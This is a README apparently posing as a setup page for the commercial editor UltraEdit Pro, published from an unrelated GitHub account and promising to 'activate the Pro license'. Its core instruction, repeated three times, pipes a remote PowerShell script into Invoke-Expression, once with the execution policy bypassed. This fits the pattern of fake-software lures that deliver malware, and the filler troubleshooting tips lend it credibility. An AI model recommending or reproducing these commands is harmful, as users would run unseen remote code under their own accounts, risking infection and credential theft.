# UltraEdit Pro Setup
One-click setup for UltraEdit Pro Setup -- the powerful text and code editor with multi-caret editing, column mode, 100 plus language syntax highlighting, 64-bit large file support, built-in FTP, and a macro scripting engine

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## Features

- Installs UltraEdit with the syntax highlighting library for over 100 programming and markup languages.
- Downloads the theme pack, icon sets, and FTP client module and applies the default coding layout.
- Activates the Pro license and enables multi-caret editing, column block mode, and the macro recorder.
- Opens UltraEdit with syntax highlighting active and the file manager panel ready for immediate use.

## System Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~200 MB free disk space

## Common Issues

**UltraEdit responds slowly when editing or scrolling through text files larger than 1 GB**

Disable word wrap and syntax highlighting for files above 100 MB in Settings > Performance to enable large file mode.

**FTP upload times out and fails when transferring large files to a remote server**

Switch from Passive to Active FTP mode in the account settings and verify the firewall allows outbound connections on port 21.

**Alternative method (if policy blocks execution):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- update PowerShell or use the full form:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.